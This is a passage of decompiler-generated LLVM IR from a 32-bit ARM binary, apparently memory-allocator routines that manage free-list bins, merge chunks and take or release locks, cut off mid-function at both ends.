  br label %dec_label_pc_13394

dec_label_pc_13394:                               ; preds = %dec_label_pc_13340, %dec_label_pc_133f8, %dec_label_pc_13390
  %v0_13394 = phi i32 [ %v0_13338, %dec_label_pc_13340 ], [ %v2_13404, %dec_label_pc_133f8 ], [ %v2_13390, %dec_label_pc_13390 ]
  store i32 %v0_13394, i32* @sl, align 4
  %v1_13398 = urem i32 %v0_13394, 2
  %v2_13398 = icmp eq i32 %v1_13398, 0
  br i1 %v2_13398, label %dec_label_pc_132c4, label %dec_label_pc_133a0

dec_label_pc_133a0:                               ; preds = %dec_label_pc_13394, %dec_label_pc_132ac
  br label %dec_label_pc_133a4

dec_label_pc_133a4:                               ; preds = %dec_label_pc_134b0, %dec_label_pc_134a8, %dec_label_pc_133a0
  %v1_133ac = phi i32 [ 1, %dec_label_pc_134b0 ], [ 1, %dec_label_pc_134a8 ], [ 0, %dec_label_pc_133a0 ]
  %v2_133a8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_133a8, i32* @r4, align 4
  store i32 %v6_132ac, i32* @r5, align 4
  store i32 %v9_132ac, i32* @r6, align 4
  store i32 %v12_132ac, i32* @r7, align 4
  store i32 %v15_132ac, i32* @r8, align 4
  store i32 %v21_132ac, i32* @sl, align 4
  ret i32 %v1_133ac

dec_label_pc_133b8:                               ; preds = %dec_label_pc_133f4
  %v0_133b8 = load i32, i32* @r5, align 4
  %v1_133b8 = add i32 %v0_133b8, 12
  store i32 1, i32* @r2, align 4
  %v1_133c0 = load i32, i32* %sb.global-to-local, align 4
  %v2_133c0 = add i32 %v1_133b8, %v1_133c0
  store i32 %v2_133c0, i32* %r1.global-to-local, align 4
  %v0_133c4 = load i32, i32* @r6, align 4
  store i32 1, i32* @r3, align 4
  %v2_133cc = inttoptr i32 %v0_133c4 to i32*
  %v3_133cc = call i32 @function_15864(i32* %v2_133cc, i32 %v2_133c0)
  %v0_133d0.pre = load i32, i32* @r5, align 4
  %v1_133d4.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_133d0

dec_label_pc_133d0:                               ; preds = %dec_label_pc_132f0, %dec_label_pc_133b8
  %v1_133d4 = phi i32 [ %v1_133d4.pre, %dec_label_pc_133b8 ], [ ptrtoint (i32* @global_var_22408.562 to i32), %dec_label_pc_132f0 ]
  %v0_133d0 = phi i32 [ %v0_133d0.pre, %dec_label_pc_133b8 ], [ %v3_132f8, %dec_label_pc_132f0 ]
  %v1_133d0 = add i32 %v0_133d0, 8
  store i32 %v1_133d0, i32* %r3.global-to-local, align 4
  %v2_133d4 = add i32 %v1_133d0, %v1_133d4
  store i32 %v2_133d4, i32* @r7, align 4
  br label %dec_label_pc_133d8

dec_label_pc_133d8:                               ; preds = %dec_label_pc_133d8.dec_label_pc_133d8_crit_edge, %dec_label_pc_133d0
  %v0_133d8 = phi i32 [ %v0_133d8.pre, %dec_label_pc_133d8.dec_label_pc_133d8_crit_edge ], [ %v2_133d4, %dec_label_pc_133d0 ]
  %v1_133d8 = inttoptr i32 %v0_133d8 to i32*
  %v2_133d8 = load i32, i32* %v1_133d8, align 4
  store i32 %v2_133d8, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v0_133d8, i32* %r2.global-to-local, align 4
  %v4_133e8 = call i32 @function_15d38(i32 %v2_133d8, i32 1, i32* %v1_133d8)
  %v2_133ec = icmp eq i32 %v4_133e8, 0
  store i1 %v2_133ec, i1* @cpsr_z, align 1
  br i1 %v2_133ec, label %dec_label_pc_133f4, label %dec_label_pc_133d8.dec_label_pc_133d8_crit_edge

dec_label_pc_133d8.dec_label_pc_133d8_crit_edge:  ; preds = %dec_label_pc_133d8
  %v0_133d8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_133d8

dec_label_pc_133f4:                               ; preds = %dec_label_pc_133d8
  %v0_133b0 = load i32, i32* @r4, align 4
  %v2_133b0 = icmp eq i32 %v0_133b0, 0
  br i1 %v2_133b0, label %dec_label_pc_1340c, label %dec_label_pc_133b8

dec_label_pc_133f8:                               ; preds = %dec_label_pc_13374
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_13404 = load i32, i32* %fp.global-to-local, align 4
  %v1_13404 = inttoptr i32 %v0_13404 to i32*
  %v2_13404 = load i32, i32* %v1_13404, align 4
  br label %dec_label_pc_13394

dec_label_pc_1340c:                               ; preds = %dec_label_pc_133f4
  %v0_1340c = load i32, i32* %fp.global-to-local, align 4
  %v1_1340c = inttoptr i32 %v0_1340c to i32*
  %v2_1340c = load i32, i32* %v1_1340c, align 4
  store i32 %v2_1340c, i32* @r0, align 4
  %v0_13314.pre = load i32, i32* @r8, align 4
  %v0_13318.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13314

dec_label_pc_13414:                               ; preds = %.thread4
  %v1_13414 = and i32 %v0_13338, -2
  store i32 %v1_13414, i32* %r3.global-to-local, align 4
  %v1_13418 = load i32, i32* %fp.global-to-local, align 4
  %v2_13418 = sub i32 %v1_13418, %v1_13414
  store i32 %v2_13418, i32* %r7.global-to-local, align 4
  %v1_1341c = add i32 %v2_13418, 8
  %v1_13420 = inttoptr i32 %v1_1341c to i32*
  %v2_13420 = load i32, i32* %v1_13420, align 4
  store i32 %v2_13420, i32* @r0, align 4
  %v3_13420 = add i32 %v2_13418, 12
  %v4_13420 = inttoptr i32 %v3_13420 to i32*
  %v5_13420 = load i32, i32* %v4_13420, align 4
  store i32 %v5_13420, i32* %ip.global-to-local, align 4
  %v9_13424 = icmp eq i32 %v5_13420, %v2_13420
  br i1 %v9_13424, label %dec_label_pc_134c4, label %dec_label_pc_1342c

dec_label_pc_1342c:                               ; preds = %dec_label_pc_13414, %dec_label_pc_13524
  %v0_13438 = phi i32 [ %v2_13418, %dec_label_pc_13414 ], [ %v0_13524, %dec_label_pc_13524 ]
  %v1_1342c = add i32 %v0_13438, 4
  %v2_1342c = inttoptr i32 %v1_1342c to i32*
  %v3_1342c = load i32, i32* %v2_1342c, align 4
  %v1_13430 = or i32 %v3_1342c, 1
  store i32 %v1_13430, i32* %r2.global-to-local, align 4
  %v1_13434 = and i32 %v3_1342c, -2
  store i32 %v1_13434, i32* %r1.global-to-local, align 4
  %v2_13438 = add i32 %v1_13434, %v0_13438
  %v3_13438 = inttoptr i32 %v2_13438 to i32*
  %v4_13438 = load i32, i32* %v3_13438, align 4
  %v1_1343c = or i32 %v4_13438, 1
  store i32 %v1_1343c, i32* %r3.global-to-local, align 4
  store i32 %v1_1343c, i32* %v3_13438, align 4
  %v0_13444 = load i32, i32* %r2.global-to-local, align 4
  %v1_13444 = load i32, i32* %r7.global-to-local, align 4
  %v2_13444 = add i32 %v1_13444, 4
  %v3_13444 = inttoptr i32 %v2_13444 to i32*
  store i32 %v0_13444, i32* %v3_13444, align 4
  %v0_13448 = load i32, i32* @r5, align 4
  %v1_13448 = add i32 %v0_13448, 8
  store i32 %v1_13448, i32* %r4.global-to-local, align 4
  %v0_1344c = load i32, i32* @r0, align 4
  %v1_1344c = load i32, i32* %ip.global-to-local, align 4
  %v2_1344c = add i32 %v1_1344c, 8
  %v3_1344c = inttoptr i32 %v2_1344c to i32*
  store i32 %v0_1344c, i32* %v3_1344c, align 4
  %v0_13450 = load i32, i32* %r4.global-to-local, align 4
  %v1_13450 = load i32, i32* %sb.global-to-local, align 4
  %v2_13450 = add i32 %v1_13450, %v0_13450
  %v3_13450 = inttoptr i32 %v2_13450 to i32*
  %v4_13450 = load i32, i32* %v3_13450, align 4
  store i32 %v4_13450, i32* %r3.global-to-local, align 4
  %v0_13454 = load i32, i32* %r7.global-to-local, align 4
  %v1_13454 = add i32 %v0_13454, 8
  %v2_13454 = inttoptr i32 %v1_13454 to i32*
  %v3_13454 = load i32, i32* %v2_13454, align 4
  store i32 %v3_13454, i32* %r2.global-to-local, align 4
  %v2_13458 = icmp eq i32 %v4_13450, 0
  store i1 %v2_13458, i1* @cpsr_z, align 1
  %v0_1345c = load i32, i32* %ip.global-to-local, align 4
  %v2_1345c = add i32 %v3_13454, 12
  %v3_1345c = inttoptr i32 %v2_1345c to i32*
  store i32 %v0_1345c, i32* %v3_1345c, align 4
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r1.global-to-local, align 4
  %v0_13464 = load i32, i32* %r4.global-to-local, align 4
  %v1_13464 = load i32, i32* %sb.global-to-local, align 4
  %v2_13464 = add i32 %v1_13464, %v0_13464
  store i32 %v2_13464, i32* @r6, align 4
  br i1 %v2_13458, label %dec_label_pc_134a8, label %dec_label_pc_1346c

dec_label_pc_1346c:                               ; preds = %dec_label_pc_1342c
  %v0_1346c = call i32 @function_15ce4()
  store i32 %v0_1346c, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13474 = load i32, i32* %r4.global-to-local, align 4
  %v2_13474 = load i32, i32* %r1.global-to-local, align 4
  %v3_13474 = add i32 %v2_13474, %v1_13474
  %v4_13474 = inttoptr i32 %v3_13474 to i32*
  store i32 0, i32* %v4_13474, align 4
  %v0_13478 = call i32 @function_15ce4()
  %v0_1347c = load i32, i32* @r5, align 4
  %v1_1347c = add i32 %v0_1347c, 12
  store i32 %v1_1347c, i32* %r3.global-to-local, align 4
  %v1_13480 = load i32, i32* %r1.global-to-local, align 4
  %v2_13480 = add i32 %v1_13480, %v1_1347c
  %v3_13480 = inttoptr i32 %v2_13480 to i32*
  %v4_13480 = load i32, i32* %v3_13480, align 4
  store i32 %v4_13480, i32* %r2.global-to-local, align 4
  %v2_13484 = icmp eq i32 %v4_13480, 0
  br i1 %v2_13484, label %dec_label_pc_134a8, label %dec_label_pc_1348c

dec_label_pc_1348c:                               ; preds = %dec_label_pc_1346c
  store i32 240, i32* %r7.global-to-local, align 4
  %v0_13490 = load i32, i32* @r6, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_134a0 = icmp eq i32 %v0_13490, -38
  br i1 %v7_134a0, label %dec_label_pc_134b0, label %dec_label_pc_134a8

dec_label_pc_134a8:                               ; preds = %dec_label_pc_1348c, %dec_label_pc_1346c, %dec_label_pc_1342c
  br label %dec_label_pc_133a4

dec_label_pc_134b0:                               ; preds = %dec_label_pc_1348c
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_133a4

dec_label_pc_134c4:                               ; preds = %dec_label_pc_13414
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_134c8 = load i32, i32* @r8, align 4
  %v1_134c8 = sub i32 32, %v0_134c8
  store i32 %v1_134c8, i32* %r1.global-to-local, align 4
  %v7_134d0 = lshr i32 1, %v1_134c8
  store i32 %v7_134d0, i32* %r4.global-to-local, align 4
  %v1_134d4 = add i32 %v0_134c8, -32
  %v6_134d4 = icmp slt i32 %v1_134d4, 0
  %v7_134d4 = icmp eq i32 %v0_134c8, 32
  store i1 %v7_134d4, i1* @cpsr_z, align 1
  %v6_134d8 = shl i32 1, %v0_134c8
  store i32 %v6_134d8, i32* %r3.global-to-local, align 4
  br i1 %v6_134d4, label %bb33, label %bb32

bb32:                                             ; preds = %dec_label_pc_134c4
  %v7_134dc = shl i32 1, %v1_134d4
  store i32 %v7_134dc, i32* %r4.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_134c4, %bb32
  %v0_134e4 = phi i32 [ %v7_134d0, %dec_label_pc_134c4 ], [ %v7_134dc, %bb32 ]
  %v1_134e0 = sub i32 -1, %v6_134d8
  %v1_134e4 = sub i32 -1, %v0_134e4
  store i32 %v1_134e4, i32* %fp.global-to-local, align 4
  store i32 %v1_134e0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_134ec

dec_label_pc_134ec:                               ; preds = %dec_label_pc_134ec.dec_label_pc_134ec_crit_edge, %bb33
  %v1_134f4 = phi i32 [ %v1_134f4.pre, %dec_label_pc_134ec.dec_label_pc_134ec_crit_edge ], [ %v1_134e0, %bb33 ]
  %v2_134ec = load i32, i32* @global_var_22408.562, align 4
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %r2.global-to-local, align 4
  %v2_134f4 = and i32 %v2_134ec, %v1_134f4
  store i32 %v2_134f4, i32* %r1.global-to-local, align 4
  %v4_134f8 = call i32 @function_15d38(i32 %v2_134ec, i32 %v2_134f4, i32* nonnull @global_var_22408.562)
  %v2_134fc = icmp eq i32 %v4_134f8, 0
  store i1 %v2_134fc, i1* @cpsr_z, align 1
  br i1 %v2_134fc, label %dec_label_pc_13504, label %dec_label_pc_134ec.dec_label_pc_134ec_crit_edge

dec_label_pc_134ec.dec_label_pc_134ec_crit_edge:  ; preds = %dec_label_pc_134ec
  %v1_134f4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_134ec

dec_label_pc_13504:                               ; preds = %dec_label_pc_134ec
  %v0_13508 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_13508, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1350c

dec_label_pc_1350c:                               ; preds = %dec_label_pc_1350c.dec_label_pc_1350c_crit_edge, %dec_label_pc_13504
  %v1_13514 = phi i32 [ %v1_13514.pre, %dec_label_pc_1350c.dec_label_pc_1350c_crit_edge ], [ %v0_13508, %dec_label_pc_13504 ]
  %v2_1350c = load i32, i32* @global_var_2240c.564, align 4
  store i32 ptrtoint (i32* @global_var_2240c.564 to i32), i32* %r2.global-to-local, align 4
  %v2_13514 = and i32 %v2_1350c, %v1_13514
  store i32 %v2_13514, i32* %r1.global-to-local, align 4
  %v4_13518 = call i32 @function_15d38(i32 %v2_1350c, i32 %v2_13514, i32* nonnull @global_var_2240c.564)
  %v2_1351c = icmp eq i32 %v4_13518, 0
  store i1 %v2_1351c, i1* @cpsr_z, align 1
  br i1 %v2_1351c, label %dec_label_pc_13524, label %dec_label_pc_1350c.dec_label_pc_1350c_crit_edge

dec_label_pc_1350c.dec_label_pc_1350c_crit_edge:  ; preds = %dec_label_pc_1350c
  %v1_13514.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1350c

dec_label_pc_13524:                               ; preds = %dec_label_pc_1350c
  %v0_13524 = load i32, i32* %r7.global-to-local, align 4
  %v1_13524 = add i32 %v0_13524, 8
  %v1_13528 = inttoptr i32 %v1_13524 to i32*
  %v2_13528 = load i32, i32* %v1_13528, align 4
  store i32 %v2_13528, i32* @r0, align 4
  %v3_13528 = add i32 %v0_13524, 12
  %v4_13528 = inttoptr i32 %v3_13528 to i32*
  %v5_13528 = load i32, i32* %v4_13528, align 4
  store i32 %v5_13528, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1342c

; uselistorder directives
  uselistorder i32 %v0_13524, { 1, 2, 0 }
  uselistorder i32 %v2_1350c, { 1, 0 }
  uselistorder i32 %v2_134ec, { 1, 0 }
  uselistorder i32 %v1_134e0, { 1, 0 }
  uselistorder i32 %v2_1340c, { 1, 0 }
  uselistorder i32 %v0_133d8, { 1, 0 }
  uselistorder i32 %v0_13394, { 0, 2, 1 }
  uselistorder i32 %v0_13338, { 0, 2, 1 }
  uselistorder i32 %v4_13324, { 1, 0 }
  uselistorder i32 %v4_13318, { 1, 0 }
  uselistorder i32 %v3_132f8, { 2, 1, 0 }
  uselistorder i32 %v0_132f8, { 1, 0 }
  uselistorder i32 %v1_132c8, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v3_132c4, { 1, 0 }
  uselistorder i32 %v2_132b0, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_1342c, { 1, 0 }
  uselistorder label %dec_label_pc_133d0, { 1, 0 }
  uselistorder label %dec_label_pc_13394, { 1, 2, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_13314, { 1, 0 }
  uselistorder label %dec_label_pc_132f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_132c4, { 1, 0 }
}

define i32 @function_1353c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1353c:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1353c = load i32, i32* @r4, align 4
  store i32 %v3_1353c, i32* %stack_var_-36, align 4
  %v6_1353c = load i32, i32* @r5, align 4
  %v9_1353c = load i32, i32* @r6, align 4
  %v12_1353c = load i32, i32* @r7, align 4
  %v15_1353c = load i32, i32* @r8, align 4
  %v21_1353c = load i32, i32* @sl, align 4
  %v1_13540 = add i32 %arg1, 4
  %v2_13540 = inttoptr i32 %v1_13540 to i32*
  %v3_13540 = load i32, i32* %v2_13540, align 4
  store i32 %v3_13540, i32* @sl, align 4
  %v1_13544 = urem i32 %v3_13540, 2
  %v2_13544 = icmp eq i32 %v1_13544, 0
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %v3_13540, i32* %r7.global-to-local, align 4
  br i1 %v2_13544, label %dec_label_pc_13558, label %dec_label_pc_13638

dec_label_pc_13558:                               ; preds = %dec_label_pc_1353c, %dec_label_pc_1362c
  %v0_13558 = phi i32 [ %v0_1362c, %dec_label_pc_1362c ], [ %v3_13540, %dec_label_pc_1353c ]
  %v3_13558 = udiv i32 %v0_13558, 16
  store i32 %v3_13558, i32* %r3.global-to-local, align 4
  %v1_1355c = add nsw i32 %v3_13558, -1
  store i32 %v1_1355c, i32* @r0, align 4
  %tmp = icmp ult i32 %v1_1355c, 33
  br i1 %tmp, label %.thread, label %dec_label_pc_1356c

.thread:                                          ; preds = %dec_label_pc_13558
  store i32 %v1_1355c, i32* @r8, align 4
  br label %dec_label_pc_13584

dec_label_pc_1356c:                               ; preds = %dec_label_pc_13558
  %tmp37 = icmp ugt i32 %v1_1355c, 7168
  br i1 %tmp37, label %.thread19, label %dec_label_pc_13578

.thread19:                                        ; preds = %dec_label_pc_1356c
  store i32 63, i32* @r8, align 4
  br label %dec_label_pc_13584

dec_label_pc_13578:                               ; preds = %dec_label_pc_1356c
  %v0_13578 = call i32 @function_175bc()
  %v3_1357c = udiv i32 %v0_13578, 2097152
  %v1_13580 = add nsw i32 %v3_1357c, -496
  store i32 %v1_13580, i32* @r8, align 4
  br label %dec_label_pc_13584

dec_label_pc_13584:                               ; preds = %.thread19, %.thread, %dec_label_pc_13578
  %v0_1358c = phi i32 [ 63, %.thread19 ], [ %v1_1355c, %.thread ], [ %v1_13580, %dec_label_pc_13578 ]
  %v3_13588 = load i32, i32* @global_var_22b38.560, align 4
  store i32 %v3_13588, i32* %r2.global-to-local, align 4
  %v3_1358c = mul i32 %v0_1358c, 16
  store i32 %v3_1358c, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* %sb.global-to-local, align 4
  %v2_13594 = icmp eq i32 %v3_13588, 0
  store i1 %v2_13594, i1* @cpsr_z, align 1
  %v1_13598 = or i32 %v3_1358c, 8
  store i32 %v1_13598, i32* %r3.global-to-local, align 4
  %v2_1359c = add i32 %v1_13598, ptrtoint (i32* @global_var_22408.562 to i32)
  store i32 %v2_1359c, i32* @r6, align 4
  br i1 %v2_13594, label %bb, label %dec_label_pc_13668

bb:                                               ; preds = %dec_label_pc_13584
  %v1_135a0 = load i32, i32* @sl, align 4
  store i32 %v1_135a0, i32* @r0, align 4
  br label %dec_label_pc_135a8

dec_label_pc_135a8:                               ; preds = %bb, %dec_label_pc_13690
  %v0_135cc36 = phi i32 [ %v1_135a0, %bb ], [ %v3_13690, %dec_label_pc_13690 ]
  %v0_135ac = phi i32 [ ptrtoint (i32* @global_var_22408.562 to i32), %bb ], [ %v0_135ac.pre, %dec_label_pc_13690 ]
  %v0_135a8 = phi i32 [ %v0_1358c, %bb ], [ %v0_135a8.pre, %dec_label_pc_13690 ]
  %v1_135a8 = add i32 %v0_135a8, 1
  store i32 %v1_135a8, i32* %r1.global-to-local, align 4
  %v4_135ac = mul i32 %v1_135a8, 16
  %v5_135ac = add i32 %v4_135ac, %v0_135ac
  %v6_135ac = inttoptr i32 %v5_135ac to i32*
  %v7_135ac = load i32, i32* %v6_135ac, align 4
  store i32 %v7_135ac, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22408.562 to i32), i32* @r6, align 4
  %v2_135b4 = icmp eq i32 %v7_135ac, 0
  br i1 %v2_135b4, label %bb31, label %.thread4

bb31:                                             ; preds = %dec_label_pc_135a8
  %v4_135b8 = mul i32 %v1_135a8, 16
  %v3_135bc = add i32 %v4_135b8, ptrtoint (i32* @global_var_22408.562 to i32)
  store i32 %v3_135bc, i32* %r3.global-to-local, align 4
  %v2_135c0 = add i32 %v4_135b8, add (i32 ptrtoint (i32* @global_var_22408.562 to i32), i32 -8)
  store i32 %v2_135c0, i32* %r2.global-to-local, align 4
  %v7_135c4 = add i32 %v4_135ac, ptrtoint (i32* @global_var_22408.562 to i32)
  %v8_135c4 = inttoptr i32 %v7_135c4 to i32*
  store i32 %v2_135c0, i32* %v8_135c4, align 4
  %v1_135c8 = load i32, i32* %r2.global-to-local, align 4
  %v2_135c8 = load i32, i32* %r3.global-to-local, align 4
  %v3_135c8 = add i32 %v2_135c8, 4
  %v4_135c8 = inttoptr i32 %v3_135c8 to i32*
  store i32 %v1_135c8, i32* %v4_135c8, align 4
  %v0_135cc.pre = load i32, i32* @r0, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_135a8, %bb31
  %v0_135cc = phi i32 [ %v0_135cc36, %dec_label_pc_135a8 ], [ %v0_135cc.pre, %bb31 ]
  %v1_135cc = load i32, i32* @sl, align 4
  %v9_135cc = icmp eq i32 %v0_135cc, %v1_135cc
  br i1 %v9_135cc, label %dec_label_pc_136ac, label %dec_label_pc_135d4

dec_label_pc_135d4:                               ; preds = %.thread4
  %v0_135d4 = load i32, i32* @r5, align 4
  %v1_135d4 = add i32 %v0_135d4, 8
  store i32 %v1_135d4, i32* %r2.global-to-local, align 4
  %v1_135d8 = load i32, i32* @r6, align 4
  %v2_135d8 = add i32 %v1_135d8, %v1_135d4
  %v3_135d8 = inttoptr i32 %v2_135d8 to i32*
  %v4_135d8 = load i32, i32* %v3_135d8, align 4
  store i32 %v4_135d8, i32* %r3.global-to-local, align 4
  %v2_135dc = icmp eq i32 %v4_135d8, 0
  store i1 %v2_135dc, i1* @cpsr_z, align 1
  store i32 %v2_135d8, i32* %r4.global-to-local, align 4
  br i1 %v2_135dc, label %dec_label_pc_1362c, label %dec_label_pc_135e8

dec_label_pc_135e8:                               ; preds = %dec_label_pc_135d4
  %v0_135e8 = call i32 @function_15ce4()
  store i32 %v0_135e8, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_135f0 = load i32, i32* %r2.global-to-local, align 4
  %v2_135f0 = load i32, i32* @r6, align 4
  %v3_135f0 = add i32 %v2_135f0, %v1_135f0
  %v4_135f0 = inttoptr i32 %v3_135f0 to i32*
  store i32 0, i32* %v4_135f0, align 4
  %v0_135f4 = call i32 @function_15ce4()
  %v0_135f8 = load i32, i32* @r5, align 4
  %v1_135f8 = add i32 %v0_135f8, 12
  store i32 %v1_135f8, i32* %r3.global-to-local, align 4
  %v1_135fc = load i32, i32* @r6, align 4
  %v2_135fc = add i32 %v1_135fc, %v1_135f8
  %v3_135fc = inttoptr i32 %v2_135fc to i32*
  %v4_135fc = load i32, i32* %v3_135fc, align 4
  store i32 %v4_135fc, i32* %r2.global-to-local, align 4
  %v2_13600 = icmp eq i32 %v4_135fc, 0
  br i1 %v2_13600, label %dec_label_pc_13624, label %dec_label_pc_13608

dec_label_pc_13608:                               ; preds = %dec_label_pc_135e8
  store i32 240, i32* %r7.global-to-local, align 4
  %v0_1360c = load i32, i32* %r4.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_1361c = icmp eq i32 %v0_1360c, -38
  br i1 %v7_1361c, label %dec_label_pc_1369c, label %dec_label_pc_13624

dec_label_pc_13624:                               ; preds = %dec_label_pc_13608, %dec_label_pc_135e8, %dec_label_pc_1369c
  %v0_13624 = load i32, i32* %fp.global-to-local, align 4
  %v1_13624 = add i32 %v0_13624, 4
  %v2_13624 = inttoptr i32 %v1_13624 to i32*
  %v3_13624 = load i32, i32* %v2_13624, align 4
  store i32 %v3_13624, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1362c

dec_label_pc_1362c:                               ; preds = %dec_label_pc_135d4, %dec_label_pc_13624
  %v0_1362c = phi i32 [ %v0_135cc, %dec_label_pc_135d4 ], [ %v3_13624, %dec_label_pc_13624 ]
  store i32 %v0_1362c, i32* @sl, align 4
  %v1_13630 = urem i32 %v0_1362c, 2
  %v2_13630 = icmp eq i32 %v1_13630, 0
  br i1 %v2_13630, label %dec_label_pc_13558, label %dec_label_pc_13638

dec_label_pc_13638:                               ; preds = %dec_label_pc_1362c, %dec_label_pc_1353c
  br label %dec_label_pc_1363c

dec_label_pc_1363c:                               ; preds = %dec_label_pc_1373c, %dec_label_pc_13734, %dec_label_pc_13638
  %v1_13644 = phi i32 [ 1, %dec_label_pc_1373c ], [ 1, %dec_label_pc_13734 ], [ 0, %dec_label_pc_13638 ]
  %v2_13640 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13640, i32* @r4, align 4
  store i32 %v6_1353c, i32* @r5, align 4
  store i32 %v9_1353c, i32* @r6, align 4
  store i32 %v12_1353c, i32* @r7, align 4
  store i32 %v15_1353c, i32* @r8, align 4
  store i32 %v21_1353c, i32* @sl, align 4
  ret i32 %v1_13644

dec_label_pc_13650:                               ; preds = %dec_label_pc_1368c
  %v0_13650 = load i32, i32* @r5, align 4
  %v1_13650 = add i32 %v0_13650, 12
  store i32 1, i32* @r2, align 4
  %v1_13658 = load i32, i32* %sb.global-to-local, align 4
  %v2_13658 = add i32 %v1_13650, %v1_13658
  store i32 %v2_13658, i32* %r1.global-to-local, align 4
  %v0_1365c = load i32, i32* @r6, align 4
  store i32 1, i32* @r3, align 4
  %v2_13664 = inttoptr i32 %v0_1365c to i32*
  %v3_13664 = call i32 @function_15864(i32* %v2_13664, i32 %v2_13658)
  %v0_13668.pre = load i32, i32* @r5, align 4
  %v1_1366c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13668

dec_label_pc_13668:                               ; preds = %dec_label_pc_13584, %dec_label_pc_13650
  %v1_1366c = phi i32 [ %v1_1366c.pre, %dec_label_pc_13650 ], [ ptrtoint (i32* @global_var_22408.562 to i32), %dec_label_pc_13584 ]
  %v0_13668 = phi i32 [ %v0_13668.pre, %dec_label_pc_13650 ], [ %v3_1358c, %dec_label_pc_13584 ]
  %v1_13668 = add i32 %v0_13668, 8
  store i32 %v1_13668, i32* %r3.global-to-local, align 4
  %v2_1366c = add i32 %v1_13668, %v1_1366c
  store i32 %v2_1366c, i32* @r7, align 4
  br label %dec_label_pc_13670

dec_label_pc_13670:                               ; preds = %dec_label_pc_13670.dec_label_pc_13670_crit_edge, %dec_label_pc_13668
  %v0_13670 = phi i32 [ %v0_13670.pre, %dec_label_pc_13670.dec_label_pc_13670_crit_edge ], [ %v2_1366c, %dec_label_pc_13668 ]
  %v1_13670 = inttoptr i32 %v0_13670 to i32*
  %v2_13670 = load i32, i32* %v1_13670, align 4
  store i32 %v2_13670, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v0_13670, i32* %r2.global-to-local, align 4
  %v4_13680 = call i32 @function_15d38(i32 %v2_13670, i32 1, i32* %v1_13670)
  %v2_13684 = icmp eq i32 %v4_13680, 0
  store i1 %v2_13684, i1* @cpsr_z, align 1
  br i1 %v2_13684, label %dec_label_pc_1368c, label %dec_label_pc_13670.dec_label_pc_13670_crit_edge

dec_label_pc_13670.dec_label_pc_13670_crit_edge:  ; preds = %dec_label_pc_13670
  %v0_13670.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_13670

dec_label_pc_1368c:                               ; preds = %dec_label_pc_13670
  %v0_13648 = load i32, i32* @r4, align 4
  %v2_13648 = icmp eq i32 %v0_13648, 0
  br i1 %v2_13648, label %dec_label_pc_13690, label %dec_label_pc_13650

dec_label_pc_13690:                               ; preds = %dec_label_pc_1368c
  %v0_13690 = load i32, i32* %fp.global-to-local, align 4
  %v1_13690 = add i32 %v0_13690, 4
  %v2_13690 = inttoptr i32 %v1_13690 to i32*
  %v3_13690 = load i32, i32* %v2_13690, align 4
  store i32 %v3_13690, i32* @r0, align 4
  store i32 %v3_13690, i32* %r7.global-to-local, align 4
  %v0_135a8.pre = load i32, i32* @r8, align 4
  %v0_135ac.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_135a8

dec_label_pc_1369c:                               ; preds = %dec_label_pc_13608
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13624

dec_label_pc_136ac:                               ; preds = %.thread4
  %v0_136ac = load i32, i32* %fp.global-to-local, align 4
  %v1_136ac = add i32 %v0_136ac, 12
  %v2_136ac = inttoptr i32 %v1_136ac to i32*
  %v3_136ac = load i32, i32* %v2_136ac, align 4
  store i32 %v3_136ac, i32* @r0, align 4
  %v1_136b0 = add i32 %v0_136ac, 8
